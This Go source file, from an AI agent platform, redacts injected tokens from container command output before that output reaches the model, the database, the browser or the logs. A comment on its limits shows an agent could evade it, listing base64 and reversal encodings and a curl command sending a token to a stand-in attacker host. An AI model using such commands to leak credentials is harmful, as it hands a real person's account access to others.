// Removes injected credentials from whatever comes out of the container, **before it leaves
// our process**.
//
// # What this layer solves
//
// We inject a real token into every execution (see credential.go). The agent being able to
// read it is an unavoidable cost: it has bash, and one `env` is enough. **But "the agent can
// read it" and "the credential leaks out" are two different things**:
//
//	the agent runs echo $AMA_TOKEN in the container
//	  → stdout comes back to our process with the plain text
//	  → goes into tool_result and back to Ark (into the model context, may show up in later thinking/replies)
//	  → goes into RunEvent and is stored (a permanent plain-text row in PG)
//	  → goes into SSE and is pushed to the browser (rendered by the frontend)
//	  → goes into logs (if anything logs tool output)
//
// A single `env` can put that token in **Ark's context, our database, the user's browser and
// the logs** all at once, and it stays there (RunEvent is a permanent record). This layer cuts
// that chain: credentials are replaced with a placeholder at the **single exit**
// (the return value of enrichingExecer.Exec).
//
// # Why this is the right place
//
// enrichingExecer is the one choke point shared by all six tools (the Execer that bash / read /
// write / edit / glob / grep get is this one). Scrubbing once here covers all six tools, and
// **no tool can bypass it**: bypassing it means no command can run at all.
//
// Scrubbing in each tool separately is wrong: all six places must be right for it to work,
// missing one gives zero errors, and the missed one is exactly the hardest to think of (how
// would a token end up in glob output? A file name can contain it).
//
// # ⚠️ What it cannot do (must be stated clearly; do not count on it against a malicious agent)
//
// This is not a sandbox and not data loss prevention. **It only blocks one thing: credentials
// flowing out unchanged through our own pipes.** An agent that deliberately wants to leak has
// countless ways around it:
//
//	echo $TOKEN | base64          # we cannot recognize it once encoded
//	echo $TOKEN | rev             # reversed
//	curl -d "$TOKEN" attacker.io  # never goes through stdout at all
//
// Blocking these assumes "the agent is untrusted", and in that case the right move is to not
// give it the credential, or to give it one with very small permissions. This layer targets
// **accidental leaks**: the agent runs `env` while debugging, a script with `set -x` prints the
// environment, a failing command stuffs the whole environment into its error message. These
// are real and frequent, and the result is the same: plain text in the database.
//
// In other words: it turns "one careless env causes a permanent plain-text leak" into "you see
// a placeholder string".
//
// # The implementation is in shared/infra/secret; here we only pick "which env vars are secrets"
//
// The replacement itself (multiple occurrences, skipping values that are too short, the
// placeholder text) lives in the single copy in `shared/infra/secret`. **We deliberately do not
// write it a second time here**: the log layer also scrubs credentials, and with three copies
// evolving separately there is no answer to "which one is right", while a missed scrub gives
// zero errors. What this layer keeps is the judgment only it can make: which environment
// variables count as secrets (tokens do, addresses and ids do not).
package shelltools

import (
	"github.com/chyroc/ama/server/shared/infra/secret"
)

// credentialPlaceholder is the mark left after replacement. It shares the same text with every
// other exit in the repo.
const credentialPlaceholder = secret.Placeholder

// minScrubLen is the lower bound for "too short to be worth scrubbing"; see secret.MinLen.
const minScrubLen = secret.MinLen

// scrubber scrubs text using a set of secret values. The zero value is usable (scrubs nothing).
//
// **It does not own the tokens**: it is built fresh for each execution and thrown away after.
// It is deliberately not a field of the container, so that we avoid "keeping a plain-text copy
// for as long as the container lives", which is exactly the shape we want to avoid.
type scrubber struct {
	inner secret.Scrubber
}

// newScrubber builds a scrubber from a set of **values already judged to be secrets**.
//
// It takes only **values**, not keys: the key name (AMA_TOKEN) is not a secret, and scrubbing
// it would hurt. When debugging you need to see "this variable is really set".
//
// # ⚠️ The "what counts as a secret" decision is made by the caller; we do not judge it again here
//
// This function used to take a `map[string]string` and filter the key names through
// `secretEnvNames`. **That was a bug that already caused a plain-text leak**: the caller
// (pause.go) had already computed the set to scrub from the actual values, including **the
// custom envs the user marked as "sensitive"**. Those key names are of course not in
// `secretEnvNames` (that table only lists variables the platform injects itself), so this
// second filter dropped all of them.
//
// Symptom: the user marked "sensitive", yet the value still went in plain text into stdout →
// tool_result → RunEvent → model context → browser, and the leak was **permanent**. Meanwhile
// the toggle in the UI looked fine.
//
// The lesson is "do not judge the same thing twice": one of the two checks will rot first, and
// a missed scrub gives zero errors. Now there is only one decision (the caller decides per
// source), and this function only does the replacement. TestUserSecretEnvIsScrubbed pins this.
//
// ⚠️ **When adding a new kind of injected credential, merge its value in at the caller**
// (platform variables also need an entry in secretEnvNames). Missing it gives no compile
// error and no red test (except the few that watch it specifically); the credential just flows
// out of the container unchanged. AMA_TOKEN was missed once right after it shipped, and a
// targeted test case caught it.
func newScrubber(values ...string) scrubber {
	if len(values) == 0 {
		return scrubber{}
	}
	return scrubber{inner: secret.NewScrubber(values...)}
}

// secretEnvNames is "among the injected envs, which ones have **values** that are credentials".
//
// The test is "would leaking it give someone usable permissions", not "does it look like a
// random string":
//
//	AMA_TOKEN                        platform-managed AMA API Key                         → yes
//	LARKSUITE_CLI_USER_ACCESS_TOKEN  Feishu user token, can read that person's chats as them → yes
//	AMA_BASE_URL                     service address → no (if scrubbed, debugging cannot see which environment was hit)
//	AMA_WORKSPACE_ID                 workspace id    → no (already appears in URLs, logs, pages)
//	LARKSUITE_CLI_APP_ID             Feishu app id   → no (public identifier)
var secretEnvNames = map[string]bool{
	EnvAMAToken: true,
	// ⚠️ Feishu user token: missing it lets a credential that "can read all group chats of a
	// real person as them" flow out of the container unchanged (into tool_result → stored in
	// RunEvent → model context → pushed to the browser), and that leak is **permanent**. The
	// app id is deliberately not here; see the table above.
	EnvLarkUserAccessToken: true,
}

// active reports whether this scrubber has anything to do.
func (s scrubber) active() bool { return s.inner.Active() }

// text removes all secret values from a piece of text.
func (s scrubber) text(in string) string { return s.inner.Text(in) }

// result removes all secret values from one execution result and returns a **new** Result.
//
// All three fields must be scrubbed, none can be skipped:
//
//   - `Stdout`: the direct output of `env` / `echo $VAR`, the most common case;
//   - `Stderr`: a script with `set -x` prints the expanded command line here, token included;
//   - `Err`: the backend's own error; some failures echo the whole ExecSpec back.
//
// ⚠️ **Do not modify the input**: the caller's value (the return of sess.Exec) may be
// referenced elsewhere. Changing it in place causes the hardest kind of mismatch to debug:
// "some places see the scrubbed version, some see plain text".
func (s scrubber) result(res *Result) *Result {
	if res == nil || !s.active() {
		return res
	}
	// A shallow copy is enough: the three fields we change are all strings (value types),
	// and the other fields contain no text.
	clone := *res
	clone.Stdout = s.text(res.Stdout)
	clone.Stderr = s.text(res.Stderr)
	clone.Err = s.text(res.Err)
	return &clone
}
